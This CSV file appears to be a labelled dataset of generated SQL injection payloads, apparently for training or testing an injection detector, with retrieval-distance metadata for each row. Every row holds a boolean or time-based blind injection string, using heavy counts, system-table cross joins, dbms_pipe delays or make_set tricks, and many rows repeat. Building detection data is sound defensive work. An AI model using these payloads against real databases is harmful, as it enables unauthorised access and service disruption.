id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000440,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'obax' like 'obax",nearest_attack_euclidean,R000973,5.683043059891626
GAN_000441,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001487,6.207094193801868
GAN_000442,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000933,7.277707666053134
GAN_000443,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.748077579908167
GAN_000444,attack,boolean,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",nearest_attack_euclidean,R001006,6.412003930007134
GAN_000445,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001446,4.928123214417451
GAN_000446,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,6.02929032816583
GAN_000447,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.877408971814298
GAN_000448,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.413402482014487
GAN_000449,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'qhgp'  =  'qhgp",nearest_attack_euclidean,R000423,6.403424311033817
GAN_000450,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",nearest_attack_euclidean,R000161,5.751174465766811
GAN_000451,attack,boolean,"1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001069,5.249294527330559
GAN_000452,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.079017928002644
GAN_000453,attack,boolean,"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R001487,4.506602283787905
GAN_000454,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001502,7.586949431272668
GAN_000455,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.250891786579934
GAN_000456,attack,boolean,"1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'wmrr' like 'wmrr",nearest_attack_euclidean,R000232,5.27129754668722
GAN_000457,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001446,4.331907442897224
GAN_000458,attack,boolean,"1'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001446,4.439078033220942
GAN_000459,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000933,5.723801589933038
GAN_000460,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001300,5.9233551768351775
GAN_000461,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.338708198315807
GAN_000462,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",nearest_attack_euclidean,R000119,4.874698135042128
GAN_000463,attack,boolean,"1%'   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000205,5.6717825841227905
GAN_000464,attack,boolean,"-2948'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'ivwt'  =  'ivwt",nearest_attack_euclidean,R001045,5.281697153677237
GAN_000465,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",nearest_attack_euclidean,R000119,5.710364582738982
GAN_000466,attack,boolean,"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",nearest_attack_euclidean,R000675,5.367532827242475
GAN_000467,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.221716865068608
GAN_000468,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001502,6.1140246086161705
GAN_000469,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000181,4.418801122617335
GAN_000470,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.283891547149544
GAN_000471,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,4.655411346874774
GAN_000472,attack,boolean,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",nearest_attack_euclidean,R001405,5.200720103401926
GAN_000473,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001391,6.728043305734794
GAN_000474,attack,boolean,"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000933,7.053177032311109
GAN_000475,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R001504,4.701737507486329
GAN_000476,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.070923716050752
GAN_000477,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,5.282401713788675
GAN_000478,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001300,4.693297280736181
GAN_000479,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.990856246788463
GAN_000480,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.5199997340617095
GAN_000481,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.85195083907213
GAN_000482,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.963656587019423
GAN_000483,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000181,4.34864722652864
GAN_000484,attack,boolean,"1'   )    )    as cgey where 2130  =  2130 and make_set  (  7914  =  4032,4032  )  --",nearest_attack_euclidean,R000675,4.79338406602704
GAN_000485,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,4.625560571926914
GAN_000486,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.444452861706853
GAN_000487,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,4.582621605845332
GAN_000488,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R001504,4.010443104253192
GAN_000489,attack,boolean,"-7382'   )    )    or make_set  (  9425  =  4330,4330  )   and    (    (   'tvaz' like 'tvaz",nearest_attack_euclidean,R000724,5.925356184184281
GAN_000490,attack,boolean,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",nearest_attack_euclidean,R000559,8.359857137141748
GAN_000491,attack,boolean,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",nearest_attack_euclidean,R000387,5.9966116621388
GAN_000492,attack,boolean,"1%'  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,5.377358001068562
GAN_000493,attack,boolean,"-3868'   )    )    or make_set  (  6809  =  1236,1236  )   and    (    (   'evnj'  =  'evnj",nearest_attack_euclidean,R001504,5.70966762539984
GAN_000494,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",nearest_attack_euclidean,R000161,6.0372919758257595
GAN_000495,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.559982839190747
GAN_000496,attack,boolean,"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",nearest_attack_euclidean,R001502,6.274770226250571
GAN_000497,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'qhgp'  =  'qhgp",nearest_attack_euclidean,R000423,5.07584875573351
GAN_000498,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001300,4.593329215702158
GAN_000499,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000813,4.564380406729883
GAN_000500,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R001075,6.380926956289343
